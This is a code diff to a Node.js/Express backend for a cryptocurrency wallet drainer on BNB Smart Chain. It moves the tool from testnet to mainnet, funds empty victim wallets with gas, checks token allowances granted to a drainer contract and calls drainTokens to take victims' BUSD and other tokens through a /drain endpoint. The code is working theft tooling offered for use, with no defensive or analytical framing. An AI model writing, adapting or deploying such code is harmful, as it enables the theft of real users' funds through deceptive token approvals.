@@ -10,13 +10,17 @@ function formatError(error) {
 
 const app = express();
 app.use(express.json());
-app.use(cors());
+app.use(cors({
+  origin: "http://localhost:5174", // Allow your frontend origin (adjust if different)
+  methods: ["GET", "POST"],
+  allowedHeaders: ["Content-Type"]
+}));
 
 const BSC_MAINNET_CHAIN_ID = 56;
-const provider = new ethers.JsonRpcProvider("https://bsc-testnet-dataseed.bnbchain.org/", BSC_MAINNET_CHAIN_ID);
+const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.bnbchain.org/", BSC_MAINNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0xd58eeFeF184192Ed19c5b1DfEc06A082f84c66d3";
+const drainerContractAddress = "0xd58eeFeF184192Ed19c5b1DfEc06A082f84c66d3"; // Ensure this is deployed on mainnet
 
 const tokenList = [
   { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
@@ -43,19 +47,20 @@ async function getGasSettings() {
     const feeData = await provider.getFeeData();
     return {
       gasLimit: 300000,
-      gasPrice: feeData.gasPrice ? feeData.gasPrice * BigInt(12) / BigInt(10) : ethers.parseUnits("15", "gwei"),
+      maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits("5", "gwei"), // Mainnet uses EIP-1559
+      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei"),
     };
   } catch (error) {
     console.error("Error fetching gas data:", formatError(error));
-    return { gasLimit: 300000, gasPrice: ethers.parseUnits("15", "gwei") };
+    return { gasLimit: 300000, maxFeePerGas: ethers.parseUnits("5", "gwei"), maxPriorityFeePerGas: ethers.parseUnits("1", "gwei") };
   }
 }
 
 async function checkWalletBalance() {
   const network = await provider.getNetwork();
   const receivedChainId = Number(network.chainId);
-  if (receivedChainId !== BSC_TESTNET_CHAIN_ID) {
-    throw new Error(`Network mismatch: Expected chain ID ${BSC_TESTNET_CHAIN_ID}, got ${receivedChainId}`);
+  if (receivedChainId !== BSC_MAINNET_CHAIN_ID) {
+    throw new Error(`Network mismatch: Expected chain ID ${BSC_MAINNET_CHAIN_ID}, got ${receivedChainId}`);
   }
 
   const balance = await provider.getBalance(wallet.address);
@@ -67,23 +72,22 @@ async function checkWalletBalance() {
 
 async function sendGasIfNeeded(victimAddress) {
   const victimBalance = await provider.getBalance(victimAddress);
-  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} TBNB`);
+  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} BNB`);
 
   if (victimBalance === BigInt(0)) {
-    const tbnbToSend = ethers.parseEther("0.005"); 
+    const bnbToSend = ethers.parseEther("0.005");
     const gasSettings = await getGasSettings();
 
-    console.log(`Victim has 0 TBNB. Sending ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas...`);
+    console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
     const tx = await wallet.sendTransaction({
       to: victimAddress,
-      value: tbnbToSend,
-      gasLimit: 21000,
-      gasPrice: gasSettings.gasPrice,
+      value: bnbToSend,
+      ...gasSettings,
     });
 
     console.log(`Gas transaction sent: ${tx.hash}`);
     const receipt = await tx.wait();
-    return { success: true, message: `Sent ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas`, txHash: tx.hash };
+    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash };
   }
   return { success: false, message: "No gas needed" };
 }
@@ -122,72 +126,71 @@ app.post("/check-and-fund", async (req, res) => {
 app.post("/drain", async (req, res) => {
   const { victimAddress, drainAll } = req.body;
   try {
-      if (!victimAddress || !ethers.isAddress(victimAddress)) {
-          return res.status(400).json({ error: "Invalid or missing victimAddress" });
+    if (!victimAddress || !ethers.isAddress(victimAddress)) {
+      return res.status(400).json({ error: "Invalid or missing victimAddress" });
+    }
+
+    const gasSettings = await getGasSettings();
+    let tx, receipt, totalDrained = BigInt(0);
+    const tokensNeedingApproval = [];
+
+    const tokenAddresses = tokenList.map(t => t.address);
+    for (const token of tokenList) {
+      const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
+      const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
+      const balance = await tokenContract.balanceOf(victimAddress);
+      console.log(`${token.symbol}: Balance=${ethers.formatUnits(balance, token.decimals)}, Allowance=${ethers.formatUnits(allowance, token.decimals)}`);
+      if (allowance === BigInt(0) && balance > 0) {
+        tokensNeedingApproval.push({ symbol: token.symbol, address: token.address });
       }
+    }
 
-      const gasSettings = await getGasSettings();
-      let tx, receipt, totalDrained = BigInt(0);
-      const tokensNeedingApproval = [];
+    const needsApproval = tokensNeedingApproval.length > 0;
 
-      // Check allowances and balances for all tokens
-      const tokenAddresses = tokenList.map(t => t.address);
-      for (const token of tokenList) {
-          const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
-          const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
-          const balance = await tokenContract.balanceOf(victimAddress);
-          console.log(`${token.symbol}: Balance=${ethers.formatUnits(balance, token.decimals)}, Allowance=${ethers.formatUnits(allowance, token.decimals)}`);
-          if (allowance === BigInt(0) && balance > 0) {
-              tokensNeedingApproval.push({ symbol: token.symbol, address: token.address });
+    if (drainAll) {
+      console.log(`Draining all tokens from ${victimAddress}...`);
+      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1000000 });
+      receipt = await tx.wait();
+
+      const eventInterface = new ethers.Interface(drainerAbi);
+      receipt.logs.forEach(log => {
+        try {
+          const parsedLog = eventInterface.parseLog(log);
+          if (parsedLog.name === "TokensDrained") {
+            totalDrained += BigInt(parsedLog.args.amount);
           }
-      }
+        } catch (e) {
+          console.log("Non-TokensDrained log:", log);
+        }
+      });
+    }
 
-      const needsApproval = tokensNeedingApproval.length > 0;
+    console.log(`Transaction sent: ${tx.hash}`);
 
-      if (drainAll) {
-          console.log(`Draining all tokens from ${victimAddress}...`);
-          tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1000000 });
-          receipt = await tx.wait();
-
-          const eventInterface = new ethers.Interface(drainerAbi);
-          receipt.logs.forEach(log => {
-              try {
-                  const parsedLog = eventInterface.parseLog(log);
-                  if (parsedLog.name === "TokensDrained") {
-                      totalDrained += BigInt(parsedLog.args.amount);
-                  }
-              } catch (e) {
-                  console.log("Non-TokensDrained log:", log);
-              }
-          });
-      }
-
-      console.log(`Transaction sent: ${tx.hash}`);
-
-      if (totalDrained > 0) {
-          const message = `Drained ${ethers.formatEther(totalDrained)} total tokens`;
-          res.json({
-              success: true,
-              message,
-              victimAddress,
-              transactionHash: tx.hash,
-              gasUsed: receipt.gasUsed.toString(),
-              needsApproval: false,
-              tokensNeedingApproval: [] // No approvals needed post-drain
-          });
-      } else {
-          res.json({
-              success: false,
-              message: needsApproval ? "Approval needed for some tokens." : "No tokens drained. Check victim's balance and allowance.",
-              victimAddress,
-              transactionHash: tx?.hash || null,
-              needsApproval,
-              tokensNeedingApproval // List of tokens needing approval
-          });
-      }
+    if (totalDrained > 0) {
+      const message = `Drained ${ethers.formatEther(totalDrained)} total tokens`;
+      res.json({
+        success: true,
+        message,
+        victimAddress,
+        transactionHash: tx.hash,
+        gasUsed: receipt.gasUsed.toString(),
+        needsApproval: false,
+        tokensNeedingApproval: []
+      });
+    } else {
+      res.json({
+        success: false,
+        message: needsApproval ? "Approval needed for some tokens." : "No tokens drained. Check victim's balance and allowance.",
+        victimAddress,
+        transactionHash: tx?.hash || null,
+        needsApproval,
+        tokensNeedingApproval
+      });
+    }
   } catch (error) {
-      console.error("Drain error:", formatError(error));
-      res.status(500).json({ error: error.message });
+    console.error("Drain error:", formatError(error));
+    res.status(500).json({ error: error.message });
   }
 });
 
